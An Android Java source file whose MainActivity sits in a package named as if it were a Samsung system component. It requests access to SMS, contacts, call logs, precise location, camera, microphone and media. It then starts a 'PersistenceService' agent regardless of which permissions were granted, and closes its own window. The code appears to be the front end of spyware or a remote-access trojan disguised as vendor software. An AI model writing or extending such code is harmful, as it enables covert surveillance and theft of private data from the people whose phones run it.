package com.samsung.android.usersuite;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ = 42;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        List<String> want = new ArrayList<>();
        want.add(Manifest.permission.READ_SMS);
        want.add(Manifest.permission.READ_CONTACTS);
        want.add(Manifest.permission.READ_CALL_LOG);
        want.add(Manifest.permission.ACCESS_FINE_LOCATION);
        want.add(Manifest.permission.CAMERA);
        want.add(Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33) want.add(Manifest.permission.POST_NOTIFICATIONS);
        if (Build.VERSION.SDK_INT <= 32) {
            want.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            want.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        } else if (Build.VERSION.SDK_INT == 33) {
            want.add(Manifest.permission.READ_MEDIA_IMAGES);
            want.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            want.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED);
        }

        List<String> missing = new ArrayList<>();
        for (String p : want) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) missing.add(p);
        }

        if (!missing.isEmpty()) {
            requestPermissions(missing.toArray(new String[0]), REQ);
            return;   // onRequestPermissionsResult decides one-time, no loops
        }
        bootService();
    }

    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] granted) {
        if (rc != REQ) return;
        Toast.makeText(this, "agent booting", Toast.LENGTH_SHORT).show();
        bootService();
    }

    private void bootService() {
        // boot unconditionally — permission state never blocks agent start
        Intent s = new Intent(this, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
        else startService(s);
        finish();
    }
}
